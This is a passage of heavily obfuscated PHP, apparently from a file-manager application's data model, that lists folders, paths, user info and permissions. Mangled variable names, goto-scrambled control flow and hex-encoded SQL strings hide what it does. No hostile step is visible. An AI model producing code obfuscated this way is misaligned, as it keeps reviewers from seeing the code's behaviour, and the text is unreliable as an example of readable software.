$dâÒ‡—–óç[$CùÃ‚ÛÇáÛ[$F™ï¼äî[431]]] = array(); } $dâÒ‡—–óç[$CùÃ‚ÛÇáÛ[$F™ï¼äî[431]]][$CùÃ‚ÛÇáÛ[$F™ï¼äî[89]]] = $CùÃ‚ÛÇáÛ[$F™ï¼äî[363]]; } goto bÁÁ…ŒÁˆ; BİÇ›¶¤¸: $F™ï¼äî =& $_SERVER[‡’¶øåüç˜]; $e÷îŠê•Œ = array_to_keyvalue($cÍòãÍˆ‘, $F™ï¼äî[33], $F™ï¼äî[431]); $e÷îŠê•Œ = array_filter(array_unique($e÷îŠê•Œ)); goto fŒÂ®»ç‡ç; bÁÁ…ŒÁˆ: foreach ($cÍòãÍˆ‘ as &$E•˜Û×ãÎ) { goto föğ“äÌ³; cëİ×áèœ‹: unset($dÖ‡‚Ç¾‡[$FÊ¯­µŒ¢›][$F™ï¼äî[75]]); $aÃÛ×¨ÅÏ = is_array($dâÒ‡—–óç[$FÊ¯­µŒ¢›]) ? $dâÒ‡—–óç[$FÊ¯­µŒ¢›] : array(); $E•˜Û×ãÎ[$F™ï¼äî[161]] = array_merge($aÃÛ×¨ÅÏ, $dÖ‡‚Ç¾‡[$FÊ¯­µŒ¢›]); goto fŸ‡ª’•“; föğ“äÌ³: $FÊ¯­µŒ¢› = $E•˜Û×ãÎ[$F™ï¼äî[431]]; if (!$FÊ¯­µŒ¢› || !isset($dÖ‡‚Ç¾‡[$FÊ¯­µŒ¢›])) { continue; } $d«Ÿ½ ï—é = $dÖ‡‚Ç¾‡[$FÊ¯­µŒ¢›]; goto Fš§¤Š‰Ÿ“; Fš§¤Š‰Ÿ“: $d«Ÿ½ ï—é[$F™ï¼äî[77]] = $E•˜Û×ãÎ[$F™ï¼äî[77]]; $d«Ÿ½ ï—é[$F™ï¼äî[28]] = $E•˜Û×ãÎ[$F™ï¼äî[28]]; if (!isset(self::$cacheFileInfo[$F™ï¼äî[437] . $FÊ¯­µŒ¢›])) { self::$cacheFileInfo[$F™ï¼äî[437] . $FÊ¯­µŒ¢›] = array_merge(array(), $d«Ÿ½ ï—é); } goto cëİ×áèœ‹; fŸ‡ª’•“: if (isset($E•˜Û×ãÎ[$F™ï¼äî[161]][$F™ï¼äî[160]])) { $E•˜Û×ãÎ[$F™ï¼äî[160]] = json_decode($E•˜Û×ãÎ[$F™ï¼äî[161]][$F™ï¼äî[160]], !0); unset($E•˜Û×ãÎ[$F™ï¼äî[161]][$F™ï¼äî[160]]); } goto bëº”ª¥Æê; bëº”ª¥Æê: } unset($E•˜Û×ãÎ); goto f×ÑóµÚ„Ã; aàĞÒĞœŞ: $dÖ‡‚Ç¾‡ = Model($F™ï¼äî[434])->field($bâ«¢Ğ Òé)->where($cÊñĞ÷)->select(); $dÖ‡‚Ç¾‡ = array_to_keyvalue($dÖ‡‚Ç¾‡, $F™ï¼äî[431]); $Dê©ß”—Ô¡ = Model($F™ï¼äî[435])->field($F™ï¼äî[436])->where($cÊñĞ÷)->select(); goto E‰××ËãÈŒ; fŒÂ®»ç‡ç: if (!$e÷îŠê•Œ) { return; } $cÊñĞ÷ = array($F™ï¼äî[432] => array($F™ï¼äî[396], $e÷îŠê•Œ)); $bâ«¢Ğ Òé = $F™ï¼äî[433]; goto aàĞÒĞœŞ; f×ÑóµÚ„Ã: } protected function _listAppendSourceInfo(&$B…§†ìÈÁ®, $f¥´ó”È†…) { goto bÛ³¯ö»»; C·ÏÄã±†: return $B…§†ìÈÁ®; goto bÆ£¯çÅÇğ; F¿ñŸó§÷: $e‚›‡ğ ‚Ö = array_to_keyvalue_group($BŠ¾…èİğÌ, $fšÁ·‘äö[381]); foreach ($B…§†ìÈÁ® as &$bèÌâàÛíÜ) { $bèÌâàÛíÜ[$fšÁ·‘äö[403]] = array($fšÁ·‘äö[441] => 0, $fšÁ·‘äö[442] => 0, $fšÁ·‘äö[443] => 0); if (isset($D†Æ©Ş°‘·[$bèÌâàÛíÜ[$fšÁ·‘äö[381]]])) { $bèÌâàÛíÜ[$fšÁ·‘äö[403]][$fšÁ·‘äö[444]] = 1; $bèÌâàÛíÜ[$fšÁ·‘äö[403]][$fšÁ·‘äö[445]] = $D†Æ©Ş°‘·[$bèÌâàÛíÜ[$fšÁ·‘äö[381]]][$fšÁ·‘äö[28]]; } if (isset($aä¨Õª“ì«[$bèÌâàÛíÜ[$fšÁ·‘äö[381]]])) { $bèÌâàÛíÜ[$fšÁ·‘äö[403]][$fšÁ·‘äö[446]] = array(); foreach ($aä¨Õª“ì«[$bèÌâàÛíÜ[$fšÁ·‘äö[381]]] as $f‚ÚÌ–â™Î) { $C„ù¸¯ “Æ = $EÅåÏ­Ì”[$f‚ÚÌ–â™Î]; $bèÌâàÛíÜ[$fšÁ·‘äö[403]][$fšÁ·‘äö[446]][] = array($fšÁ·‘äö[447] => $C„ù¸¯ “Æ[$fšÁ·‘äö[371]], $fšÁ·‘äö[398] => $C„ù¸¯ “Æ[$fšÁ·‘äö[28]], $fšÁ·‘äö[448] => $C„ù¸¯ “Æ[$fšÁ·‘äö[449]]); } } if (isset($e‚›‡ğ ‚Ö[$bèÌâàÛíÜ[$fšÁ·‘äö[381]]])) { $bèÌâàÛíÜ[$fšÁ·‘äö[403]][$fšÁ·‘äö[450]] = array(); foreach ($e‚›‡ğ ‚Ö[$bèÌâàÛíÜ[$fšÁ·‘äö[381]]] as $C·¹¤Õ‚Ó¿) { $bèÌâàÛíÜ[$fšÁ·‘äö[403]][$fšÁ·‘äö[450]] = array($fšÁ·‘äö[451] => $C·¹¤Õ‚Ó¿[$fšÁ·‘äö[452]], $fšÁ·‘äö[453] => $C·¹¤Õ‚Ó¿[$fšÁ·‘äö[454]], $fšÁ·‘äö[455] => $C·¹¤Õ‚Ó¿[$fšÁ·‘äö[381]], $fšÁ·‘äö[456] => $C·¹¤Õ‚Ó¿[$fšÁ·‘äö[457]], $fšÁ·‘äö[458] => $C·¹¤Õ‚Ó¿[$fšÁ·‘äö[459]], $fšÁ·‘äö[460] => $C·¹¤Õ‚Ó¿[$fšÁ·‘äö[460]], $fšÁ·‘äö[461] => $C·¹¤Õ‚Ó¿[$fšÁ·‘äö[461]]); } } } unset($bèÌâàÛíÜ); goto C·ÏÄã±†; eç¡øë¼…: $EÅåÏ­Ì” = array_to_keyvalue($FÆóºóõ¶À, $fšÁ·‘äö[371]); $aä¨Õª“ì« = array_to_keyvalue_group($EÉ¦Â‡•³, $fšÁ·‘äö[75], $fšÁ·‘äö[405]); $D†Æ©Ş°‘· = array_to_keyvalue($aÚÄâ«¨Û¢, $fšÁ·‘äö[75]); goto F¿ñŸó§÷; bÛ³¯ö»»: $fšÁ·‘äö =& $_SERVER[‡’¶øåüç˜]; if (!defined($fšÁ·‘äö[438])) { return; } $FÆóºóõ¶À = Model($fšÁ·‘äö[439])->listData(); goto D”ù†øâ¡ø; D”ù†øâ¡ø: $EÉ¦Â‡•³ = Model($fšÁ·‘äö[404])->listData(); $aÚÄâ«¨Û¢ = Model($fšÁ·‘äö[393])->listData(); $BŠ¾…èİğÌ = Model($fšÁ·‘äö[440])->listSimple(); goto eç¡øë¼…; bÆ£¯çÅÇğ: } protected function _listAppendChildren(&$DÊÔó’ÅĞ, $CÀÖ†¾ñ‡) { goto b¤¸–Â‡‚Ô; b¤¸–Â‡‚Ô: $fßÈ¾…• =& $_SERVER[‡’¶øåüç˜]; $E…•Æ™Óğ = $fßÈ¾…•[365]; $cï‚ñÃÂê¬ = array(); goto b„å¹½ã÷Ã; A†¡ÔãöÖ: $eÂŞÏĞÖ—° = $this->tablePrefix . $this->tableName; for ($E’œ‹Ÿ™ = 0; $E’œ‹Ÿ™ < $cò½Œè¤êì; $E’œ‹Ÿ™++) { $f®¡Œä¥ = intval($DÊÔó’ÅĞ[$E’œ‹Ÿ™][$fßÈ¾…•[409]]); if ($DÊÔó’ÅĞ[$E’œ‹Ÿ™][$fßÈ¾…•[382]]) { $Côˆ´Ü† = $DÊÔó’ÅĞ[$E’œ‹Ÿ™][$fßÈ¾…•[381]]; $E…•Æ™Óğ .= "\123\105\114\105\x43\124\x20\52\x20\x46\122\x4f\115\x20\x28\x53\x45\x4c\x45\103\124\x20\x27{$Côˆ´Ü†}\x5f\x68\141\x73\106\151\x6c\x65\x27\x20\141\x73\40\x68\141\x73\54\x63\157\165\x6e\x74\50\x31\51\x20\141\x73\40\150\141\163\x43\157\165\x6e\x74\x20\106\122\x4f\x4d\x20\140{$eÂŞÏĞÖ—°}\x60\40\12\x9\x9\11\x9\11\x77\x68\x65\162\x65\x20\160\x61\162\145\x6e\x74\111\104\75{$Côˆ´Ü†}\x20\x61\156\144\x20\x69\x73\x46\157\154\x64\145\162\75\x30\x20\x61\156\x64\x20\x69\163\x44\x65\x6c\145\164\x65\x3d{$f®¡Œä¥}\x29\x20\x61\x73\40\164\142\61\x5f{$Côˆ´Ü†}\x20\x75\156\151\x6f\156\x20\141\x6c\154\40\12\11\11\x9\x9\x9\x53\105\114\x45\103\x54\40\52\x20\x46\122\x4f\115\40\50\123\105\114\x45\103\x54\x20\47{$Côˆ´Ü†}\x5f\150\141\x73\106\157\154\x64\145\x72\47\x20\141\163\40\x68\x61\x73\x46\x69\x6c\145\x2c\x63\157\x75\x6e\x74\x28\x31\x29\40\141\163\40\x68\x61\x73\103\157\x75\156\x74\x20\x46\x52\117\115\40\140{$eÂŞÏĞÖ—°}\x60\40\xa\11\x9\11\11\11\x77\x68\x65\x72\x65\40\160\141\x72\145\x6e\x74\111\x44\x3d{$Côˆ´Ü†}\40\141\156\x64\x20\151\x73\x46\157\154\x64\x65\x72\75\61\x20\141\156\144\x20\x69\x73\x44\145\x6c\145\x74\x65\75{$f®¡Œä¥}\x29\x20\x61\163\40\164\142\62\137{$Côˆ´Ü†}\40\165\156\151\157\x6e\x20\x61\154\154\x20"; } if ((strlen($E…•Æ™Óğ) >= $C©µôãááƒ || $E’œ‹Ÿ™ == $cò½Œè¤êì - 1) && $E…•Æ™Óğ) { $E…•Æ™Óğ = substr($E…•Æ™Óğ, 0, -strlen($fßÈ¾…•[462])); $Dâ„ÍÉ£È = $this->query($E…•Æ™Óğ); $cï‚ñÃÂê¬ = array_merge($cï‚ñÃÂê¬, $Dâ„ÍÉ£È); $E…•Æ™Óğ = $fßÈ¾…•[33]; } } $cï‚ñÃÂê¬ = array_to_keyvalue($cï‚ñÃÂê¬, $fßÈ¾…•[463]); goto eù’²×Ç¤; b„å¹½ã÷Ã: $C©µôãááƒ = 1024 * 50; $DÊÔó’ÅĞ = is_array($DÊÔó’ÅĞ) ? $DÊÔó’ÅĞ : array(); $cò½Œè¤êì = count($DÊÔó’ÅĞ); goto A†¡ÔãöÖ; eù’²×Ç¤: foreach ($DÊÔó’ÅĞ as &$D¨êÀ™Æ¡õ) { if ($D¨êÀ™Æ¡õ[$fßÈ¾…•[382]]) { unset($D¨êÀ™Æ¡õ[$fßÈ¾…•[384]]); $D¨êÀ™Æ¡õ[$fßÈ¾…•[196]] = intval($cï‚ñÃÂê¬[$D¨êÀ™Æ¡õ[$fßÈ¾…•[381]] . $fßÈ¾…•[464]][$fßÈ¾…•[465]]); $D¨êÀ™Æ¡õ[$fßÈ¾…•[195]] = intval($cï‚ñÃÂê¬[$D¨êÀ™Æ¡õ[$fßÈ¾…•[381]] . $fßÈ¾…•[466]][$fßÈ¾…•[465]]); } } unset($D¨êÀ™Æ¡õ); goto E©Ïä¡ÒŸ; E©Ïä¡ÒŸ: } protected function _listAppendAuth(&$f²·ÇÜƒÑŠ) { goto a¸ƒÖªÄ¥ò; cİ™âÔ¡„: $DÕò×İéõ = Model($F¦Åõêá“Ô[467])->getSourceList($f¡©”®Ş, $aºéŸÅé¬ó); foreach ($f²·ÇÜƒÑŠ as $Cæòã®Õëç => &$eñÖì¥İÙô) { $eñÖì¥İÙô[$F¦Åõêá“Ô[388]] = $DÕò×İéõ[$eñÖì¥İÙô[$F¦Åõêá“Ô[381]]]; if (!$eñÖì¥İÙô[$F¦Åõêá“Ô[388]] && $eñÖì¥İÙô[$F¦Åõêá“Ô[383]] == self::TYPE_GROUP) { $eñÖì¥İÙô[$F¦Åõêá“Ô[388]] = Action($F¦Åõêá“Ô[468])->pathGroupAuthMake($eñÖì¥İÙô[$F¦Åõêá“Ô[469]]); if (!$eñÖì¥İÙô[$F¦Åõêá“Ô[388]] && !_get($GLOBALS, $F¦Åõêá“Ô[470])) { $eñÖì¥İÙô[$F¦Åõêá“Ô[193]] = !1; $eñÖì¥İÙô[$F¦Åõêá“Ô[192]] = !1; } } if ($eñÖì¥İÙô[$F¦Åõêá“Ô[388]]) { $eñÖì¥İÙô[$F¦Åõêá“Ô[193]] = AuthModel::authCheckEdit($eñÖì¥İÙô[$F¦Åõêá“Ô[388]][$F¦Åõêá“Ô[389]]); $eñÖì¥İÙô[$F¦Åõêá“Ô[192]] = AuthModel::authCheckView($eñÖì¥İÙô[$F¦Åõêá“Ô[388]][$F¦Åõêá“Ô[389]]); } $this->groupPathDisplay($eñÖì¥İÙô); } unset($eñÖì¥İÙô); goto fãòøÚ˜â›; a¸ƒÖªÄ¥ò: $F¦Åõêá“Ô =& $_SERVER[‡’¶øåüç˜]; if (!defined($F¦Åõêá“Ô[438])) { return; } $f¡©”®Ş = array(); goto Fœ†×Ø™Û³; Fœ†×Ø™Û³: foreach ($f²·ÇÜƒÑŠ as $eñÖì¥İÙô) { if ($eñÖì¥İÙô[$F¦Åõêá“Ô[383]] == self::TYPE_GROUP) { $f¡©”®Ş[] = $eñÖì¥İÙô[$F¦Åõêá“Ô[381]]; } } if (!$f¡©”®Ş) { return; } $aºéŸÅé¬ó = array_to_keyvalue($f²·ÇÜƒÑŠ, $F¦Åõêá“Ô[381]); goto cİ™âÔ¡„; fãòøÚ˜â›: } public function groupPathDisplay(&$bˆŒ¹È‹¼) { goto D‘§Ò¯†®; E Ù˜ÊñÀÁ: $bˆŒ¹È‹¼[$e¾‰ÔšÍÊœ[473]] = $cª¦½êª£ù[$e¾‰ÔšÍÊœ[474]]; $bˆŒ¹È‹¼[$e¾‰ÔšÍÊœ[392]] = $cª¦½êª£ù[$e¾‰ÔšÍÊœ[472]]; $bˆŒ¹È‹¼[$e¾‰ÔšÍÊœ[475]] = $cª¦½êª£ù[$e¾‰ÔšÍÊœ[476]]; goto eÎÇ“âÙÕ; D‘§Ò¯†®: $e¾‰ÔšÍÊœ =& $_SERVER[‡’¶øåüç˜]; if ($bˆŒ¹È‹¼[$e¾‰ÔšÍÊœ[383]] != self::TYPE_GROUP) { return; } $cª¦½êª£ù = Model($e¾‰ÔšÍÊœ[471])->getInfo($bˆŒ¹È‹¼[$e¾‰ÔšÍÊœ[469]]); goto fš×åÇŠ¼æ; eÎÇ“âÙÕ: $bˆŒ¹È‹¼[$e¾‰ÔšÍÊœ[477]] = $DéáØˆ–‘ . $cª¦½êª£ù[$e¾‰ÔšÍÊœ[403]][$e¾‰ÔšÍÊœ[381]]; goto C‚ÜîŠ’ˆ»; fš×åÇŠ¼æ: $E÷Ô³ËùÂ© = $this->parentLevelArray($cª¦½êª£ù[$e¾‰ÔšÍÊœ[472]]); $DéáØˆ–‘ = $e¾‰ÔšÍÊœ[33]; foreach ($E÷Ô³ËùÂ© as $eø‰’ÜÎÆ¢) { $e“‚‡¾‰Õ° = Model($e¾‰ÔšÍÊœ[471])->getInfo($eø‰’ÜÎÆ¢); $DéáØˆ–‘ .= $e“‚‡¾‰Õ°[$e¾‰ÔšÍÊœ[403]][$e¾‰ÔšÍÊœ[381]] . $e¾‰ÔšÍÊœ[47]; } goto E Ù˜ÊñÀÁ; C‚ÜîŠ’ˆ»: } protected function _listAppendPath(&$dÇİ–‚†Ç) { goto EÑŠâ•í¸¨; BÔ‹äëÂÜî: foreach ($dÇİ–‚†Ç as &$F÷ì´ĞßÛ«) { $BªÜÎ»º¤«[$F÷ì´ĞßÛ«[$dè¡…³¬í¸[381]]] = $F÷ì´ĞßÛ«[$dè¡…³¬í¸[28]]; $b‚õÛò§Í = $this->parentLevelArray($F÷ì´ĞßÛ«[$dè¡…³¬í¸[472]]); foreach ($b‚õÛò§Í as $Bå»Ã§äº³ => $CÕ­¢Üºœ½) { if ($Bå»Ã§äº³ != 0 && !isset($BªÜÎ»º¤«[$CÕ­¢Üºœ½])) { $e°˜µÎñÛ[] = $CÕ­¢Üºœ½; } } } unset($F÷ì´ĞßÛ«); if (count($e°˜µÎñÛ) > 0) { $a‹†Ÿñ“‰Æ = array($dè¡…³¬í¸[395] => array($dè¡…³¬í¸[396], $e°˜µÎñÛ)); if (count($e°˜µÎñÛ) == 1) { $dóÖ”Â‡´› = $this->sourceInfo($e°˜µÎñÛ[0]); $aÀÃ­èİù® = is_array($dóÖ”Â‡´›) ? array($dóÖ”Â‡´›) : !1; } else { $aÀÃ­èİù® = $this->field($dè¡…³¬í¸[478])->where($a‹†Ÿñ“‰Æ)->select(); } $eÓÁÄò´ÁÖ = array_to_keyvalue($aÀÃ­èİù®, $dè¡…³¬í¸[381], $dè¡…³¬í¸[28]); $BªÜÎ»º¤« = array_merge_index($BªÜÎ»º¤«, $eÓÁÄò´ÁÖ); } goto A¤¸çöÁ ; EÑŠâ•í¸¨: $dè¡…³¬í¸ =& $_SERVER[‡’¶øåüç˜]; static $BªÜÎ»º¤« = array(); $e°˜µÎñÛ = array(); goto BÔ‹äëÂÜî; A¤¸çöÁ : $a±³ñ‘õ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($dÇİ–‚†Ç as &$F÷ì´ĞßÛ«) { goto cæ‘÷å¾‚§; F·Æİ¹Õ†: if ($b‚õÛò§Í) { $aƒÅ¡¸ß¾£ .= $F÷ì´ĞßÛ«[$dè¡…³¬í¸[28]]; } if ($F÷ì´ĞßÛ«[$dè¡…³¬í¸[382]]) { $aƒÅ¡¸ß¾£ .= $dè¡…³¬í¸[8]; } $F÷ì´ĞßÛ«[$dè¡…³¬í¸[479]] = str_replace($dè¡…³¬í¸[480], $dè¡…³¬í¸[8], $aƒÅ¡¸ß¾£); goto Eñ¢İš•¬„; cæ‘÷å¾‚§: $b‚õÛò§Í = $this->parentLevelArray($F÷ì´ĞßÛ«[$dè¡…³¬í¸[472]]); $aƒÅ¡¸ß¾£ = $this->_listAppendPathRoot($F÷ì´ĞßÛ«, $b‚õÛò§Í); foreach ($b‚õÛò§Í as $Bå»Ã§äº³ => $CÕ­¢Üºœ½) { if ($Bå»Ã§äº³ == 0 && $aƒÅ¡¸ß¾£ && $F÷ì´ĞßÛ«[$dè¡…³¬í¸[383]] == self::TYPE_GROUP) { continue; } if (isset($BªÜÎ»º¤«[$CÕ­¢Üºœ½])) { $aƒÅ¡¸ß¾£ .= $BªÜÎ»º¤«[$CÕ­¢Üºœ½] . $dè¡…³¬í¸[8]; } } goto F·Æİ¹Õ†; Eñ¢İš•¬„: $Ağ³‚Š–­š = trim($F÷ì´ĞßÛ«[$dè¡…³¬í¸[479]], $dè¡…³¬í¸[8]); if ($F÷ì´ĞßÛ«[$dè¡…³¬í¸[474]] == $dè¡…³¬í¸[481] && $Ağ³‚Š–­š) { $F÷ì´ĞßÛ«[$dè¡…³¬í¸[28]] = $Ağ³‚Š–­š; } $this->_listAppendPathRecycle($F÷ì´ĞßÛ«, $b‚õÛò§Í, $a±³ñ‘õ); goto EÛ†™Œ»Ğ¦; EÛ†™Œ»Ğ¦: } unset($F÷ì´ĞßÛ«); goto c ‹×Ë„®; c ‹×Ë„®: return $dÇİ–‚†Ç; goto eŸŠÀÒ‚; eŸŠÀÒ‚: } private function _listAppendPathRecycle(&$AÃöåß·¯‹, $eØ£ßÌ³ÚÚ, $AğÛò™–Øä) { goto Cçç§ÊÁŠ; Cçç§ÊÁŠ: $aêÃ…°ë =& $_SERVER[‡’¶øåüç˜]; if (intval($AÃöåß·¯‹[$aêÃ…°ë[383]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($AğÛò™–Øä, $eØ£ßÌ³ÚÚ) && $AÃöåß·¯‹[$aêÃ…°ë[381]] != $AğÛò™–Øä) { return; } goto c†²¹ƒÔö˜; D®³ß¸ï: $AÃöåß·¯‹[$aêÃ…°ë[472]] = $aêÃ…°ë[483] . implode($aêÃ…°ë[47], array_slice($eØ£ßÌ³ÚÚ, 1)) . $aêÃ…°ë[47]; if ($AÃöåß·¯‹[$aêÃ…°ë[381]] == $AğÛò™–Øä) { $AÃöåß·¯‹[$aêÃ…°ë[472]] = $aêÃ…°ë[483]; $AÃöåß·¯‹[$aêÃ…°ë[474]] = $aêÃ…°ë[481]; $AÃöåß·¯‹[$aêÃ…°ë[28]] = LNG($aêÃ…°ë[482]); } $AÃöåß·¯‹[$aêÃ…°ë[484]] = $aêÃ…°ë[485]; goto dÌÓØÑ»â¯; c†²¹ƒÔö˜: $E’º÷“ˆ– = explode($aêÃ…°ë[8], trim($AÃöåß·¯‹[$aêÃ…°ë[479]], $aêÃ…°ë[8])); $f—¡±ó‚Ä = implode($aêÃ…°ë[8], array_slice($E’º÷“ˆ–, 2)); $AÃöåß·¯‹[$aêÃ…°ë[479]] = $aêÃ…°ë[8] . LNG($aêÃ…°ë[482]) . $aêÃ…°ë[8] . ltrim($f—¡±ó‚Ä, $aêÃ…°ë[8]); goto D®³ß¸ï; dÌÓØÑ»â¯: } protected function _listAppendPathRoot(&$eİèå†‡¹, $B¢²ß»¤†) { $b®æ‚‰Î’ =& $_SERVER[‡’¶øåüç˜]; $E’ÊÚ”‚Ş = $b®æ‚‰Î’[33]; if ($eİèå†‡¹[$b®æ‚‰Î’[383]] == self::TYPE_USER) { if (defined($b®æ‚‰Î’[438]) && $eİèå†‡¹[$b®æ‚‰Î’[469]] == USER_ID) { $E’ÊÚ”‚Ş = LNG($b®æ‚‰Î’[486]); if (!$B¢²ß»¤†) { $eİèå†‡¹[$b®æ‚‰Î’[28]] = $E’ÊÚ”‚Ş; } } else { $d…òšŞÌ©° = Model($b®æ‚‰Î’[487])->getInfoSimple($eİèå†‡¹[$b®æ‚‰Î’[469]]); $E’ÊÚ”‚Ş = LNG($b®æ‚‰Î’[488]) . $b®æ‚‰Î’[157] . $d…òšŞÌ©°[$b®æ‚‰Î’[28]] . $b®æ‚‰Î’[489]; } } else { if ($eİèå†‡¹[$b®æ‚‰Î’[383]] == self::TYPE_GROUP) { $d…òšŞÌ©° = Model($b®æ‚‰Î’[471])->getInfoSimple($eİèå†‡¹[$b®æ‚‰Î’[469]]); $E’ÊÚ”‚Ş = $d…òšŞÌ©°[$b®æ‚‰Î’[28]]; } else { if ($eİèå†‡¹[$b®æ‚‰Î’[383]] == self::TYPE_SYSTEM) { $d…òšŞÌ©° = $this->sourceInfo($B¢²ß»¤†[0], !0); $E’ÊÚ”‚Ş = $d…òšŞÌ©°[$b®æ‚‰Î’[28]]; } } } $E’ÊÚ”‚Ş = $E’ÊÚ”‚Ş ? $b®æ‚‰Î’[8] . $E’ÊÚ”‚Ş . $b®æ‚‰Î’[8] : $b®æ‚‰Î’[8]; return $E’ÊÚ”‚Ş; } protected function _listAppendUser(&$c†İ‹½ƒ¢ù) { goto CŠâ†ˆ£Î; D½¸¥ªİ: unset($dë…‰ùÜ´); goto f§ƒ¶Ôß±ë; CŠâ†ˆ£Î: $A¡œê©Š‚Ç =& $_SERVER[‡’¶øåüç˜]; $FóÍ‚‹è‹Â = array_to_keyvalue($c†İ‹½ƒ¢ù, $A¡œê©Š‚Ç[33], $A¡œê©Š‚Ç[390]); $FÔÊµ“‹µ° = array_to_keyvalue($c†İ‹½ƒ¢ù, $A¡œê©Š‚Ç[33], $A¡œê©Š‚Ç[391]); goto c øÒ©š¨Ç; c øÒ©š¨Ç: $fß±í¹¡Ô = array_merge($FóÍ‚‹è‹Â, $FÔÊµ“‹µ°); $b¾±Ü÷§å• = Model($A¡œê©Š‚Ç[490])->userListInfo($fß±í¹¡Ô); foreach ($c†İ‹½ƒ¢ù as &$dë…‰ùÜ´) { $fÇ‹ŒÈ¹«’ = $dë…‰ùÜ´[$A¡œê©Š‚Ç[390]]; $dë…‰ùÜ´[$A¡œê©Š‚Ç[390]] = $b¾±Ü÷§å•[$fÇ‹ŒÈ¹«’] ? $b¾±Ü÷§å•[$fÇ‹ŒÈ¹«’] : !1; $fÇ‹ŒÈ¹«’ = $dë…‰ùÜ´[$A¡œê©Š‚Ç[391]]; $dë…‰ùÜ´[$A¡œê©Š‚Ç[391]] = $b¾±Ü÷§å•[$fÇ‹ŒÈ¹«’] ? $b¾±Ü÷§å•[$fÇ‹ŒÈ¹«’] : !1; if (isset($dë…‰ùÜ´[$A¡œê©Š‚Ç[429]]) && $dë…‰ùÜ´[$A¡œê©Š‚Ç[429]][$A¡œê©Š‚Ç[491]]) { $F‹‚Ù¡ï = $GLOBALS[$A¡œê©Š‚Ç[6]][$A¡œê©Š‚Ç[84]][$A¡œê©Š‚Ç[492]]; if ($dë…‰ùÜ´[$A¡œê©Š‚Ç[429]][$A¡œê©Š‚Ç[493]] <= time() - $F‹‚Ù¡ï) { $this->metaSet($dë…‰ùÜ´[$A¡œê©Š‚Ç[381]], $A¡œê©Š‚Ç[491], null); $this->metaSet($dë…‰ùÜ´[$A¡œê©Š‚Ç[381]], $A¡œê©Š‚Ç[493], null); unset($dë…‰ùÜ´[$A¡œê©Š‚Ç[429]][$A¡œê©Š‚Ç[491]]); continue; } $fˆÈä¡¤ôÀ = $dë…‰ùÜ´[$A¡œê©Š‚Ç[429]][$A¡œê©Š‚Ç[491]]; $dë…‰ùÜ´[$A¡œê©Š‚Ç[429]][$A¡œê©Š‚Ç[494]] = Model($A¡œê©Š‚Ç[490])->getInfoSimpleOuter($fˆÈä¡¤ôÀ); } } goto D½¸¥ªİ; f§ƒ¶Ôß±ë: } public function parentLevelArray($E¡ù‹ —Ûô) { $d”õÄÌÜë… =& $_SERVER[‡’¶øåüç˜]; $E¡ù‹ —Ûô = explode($d”õÄÌÜë…[47], trim($E¡ù‹ —Ûô, $d”õÄÌÜë…[47])); return array_remove_value($E¡ù‹ —Ûô, $d”õÄÌÜë…[481]); } public function listAll($DÎµ„ª™¸) { goto dë¬³¤ëğÎ; B­ô£èÀ…Í: $this->_listAppendAuth($A¸ÏéíÅªµ); $this->_listAppendUser($A¸ÏéíÅªµ); $this->_listAppendPath($A¸ÏéíÅªµ); goto EçĞ†Ïßõ¥; dêì“Áö£’: $F“—Ü‡Ï… = $b•½Ì¿öêƒ[499]; $B˜®Ù·¨´ = "\x4c\x45\106\x54\x20\x4a\117\x49\116\x20{$this->tablePrefix}\x69\x6f\137\x66\x69\x6c\145\40\x66\151\154\145\40\157\156\x20\163\157\x75\x72\143\145\x2e\146\151\x6c\x65\111\104\40\75\x20\146\151\154\145\56\x66\x69\154\145\111\104"; $A¸ÏéíÅªµ = $this->alias($b•½Ì¿öêƒ[500])->field($F“—Ü‡Ï…)->where($C‚·ÀƒÒìê)->join($B˜®Ù·¨´)->select(); goto B­ô£èÀ…Í; EçĞ†Ïßõ¥: $A¸ÏéíÅªµ = array_to_keyvalue($A¸ÏéíÅªµ, $b•½Ì¿öêƒ[381]); $Aé¤Ğè¡à» = "\57{$f°´Ù¿ñô¦[$b•½Ì¿öêƒ[28]]}\57"; $Aé¤Ğè¡à» = $Aé¤Ğè¡à» == $b•½Ì¿öêƒ[480] ? $b•½Ì¿öêƒ[8] : $Aé¤Ğè¡à»; goto EËèœ”ñé™; EËèœ”ñé™: $Fîãºó¨ó = array(); foreach ($A¸ÏéíÅªµ as $c¶‰ñ•ÕÅ => $Cœ»Ãî“°) { goto dî¯ã‹¹Ï; Eˆæšö×Ğ: if (!$Cœ»Ãî“°[$b•½Ì¿öêƒ[382]]) { $EÛ…³±ˆÒ—[$b•½Ì¿öêƒ[431]] = $Cœ»Ãî“°[$b•½Ì¿öêƒ[431]]; $EÛ…³±ˆÒ—[$b•½Ì¿öêƒ[502]] = $Cœ»Ãî“°[$b•½Ì¿öêƒ[75]]; } $Fîãºó¨ó[] = $EÛ…³±ˆÒ—; goto Aï£÷óëÖƒ; dî¯ã‹¹Ï: $dõ˜†‘Á¨ = $this->parentLevelArray($Cœ»Ãî“°[$b•½Ì¿öêƒ[472]]); array_shift($dõ˜†‘Á¨); $d†å¶·–‡¸ = $Aé¤Ğè¡à»; goto DÀ‚ĞæŸ•ƒ; C·³Š”Û‡ª: $d†å¶·–‡¸ = str_replace($b•½Ì¿öêƒ[480], $b•½Ì¿öêƒ[8], $d†å¶·–‡¸); $d†å¶·–‡¸ = str_replace($b•½Ì¿öêƒ[480], $b•½Ì¿öêƒ[8], $d†å¶·–‡¸); $EÛ…³±ˆÒ— = array($b•½Ì¿öêƒ[399] => str_replace($b•½Ì¿öêƒ[480], $b•½Ì¿öêƒ[8], $d†å¶·–‡¸), $b•½Ì¿öêƒ[501] => intval($Cœ»Ãî“°[$b•½Ì¿öêƒ[382]]), $b•½Ì¿öêƒ[403] => $this->pathInfoFilter($Cœ»Ãî“°, !0)); goto Eˆæšö×Ğ; DÀ‚ĞæŸ•ƒ: for ($AÖÀÇ½œÏ = 0; $AÖÀÇ½œÏ < count($dõ˜†‘Á¨); $AÖÀÇ½œÏ++) { $d†å¶·–‡¸ .= $A¸ÏéíÅªµ[$dõ˜†‘Á¨[$AÖÀÇ½œÏ]][$b•½Ì¿öêƒ[28]] . $b•½Ì¿öêƒ[8]; } $d†å¶·–‡¸ .= $Cœ»Ãî“°[$b•½Ì¿öêƒ[28]]; if ($Cœ»Ãî“°[$b•½Ì¿öêƒ[382]]) { $d†å¶·–‡¸ .= $b•½Ì¿öêƒ[8]; } goto C·³Š”Û‡ª; Aï£÷óëÖƒ: } return $Fîãºó¨ó; goto 